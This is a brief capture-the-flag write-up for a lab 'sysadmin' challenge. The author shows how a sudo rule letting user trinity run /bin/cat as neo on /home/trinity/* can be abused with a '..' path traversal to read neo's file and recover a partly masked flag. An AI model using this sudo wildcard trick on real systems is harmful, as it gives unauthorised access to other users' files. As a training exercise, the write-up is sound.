# Sysadmin part 6 - Challenge 90

There's a phonebook file in our home directory but we can't read it because it's owned by neo. After looking around for a while I found that we have sudo rights as neo to our own directory.

```
trinity@forensics:~$ sudo -l
Matching Defaults entries for trinity on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, insults

User trinity may run the following commands on this host:
    (neo) /bin/cat /home/trinity/*
```

Aw, that's too bad, nothing interesting in the phonebook...

```
trinity@forensics:~$ sudo -u neo /bin/cat /home/trinity/*      
The Oracle        1800-133-7133
Persephone        345-555-1244    
```

With a little experimentation, I found that the wildcard * allows us to follow path upstream as well (.. is included). So we can go into neo's directory and read his phonebook..

```
trinity@forensics:~$ sudo -u neo /bin/cat /home/trinity/../neo/phonebook
The Oracle        1800-133-7133
Persephone        345-555-1244

change my current password FLAG-lRGLKGh2***************
don't forget to remove this :)
```
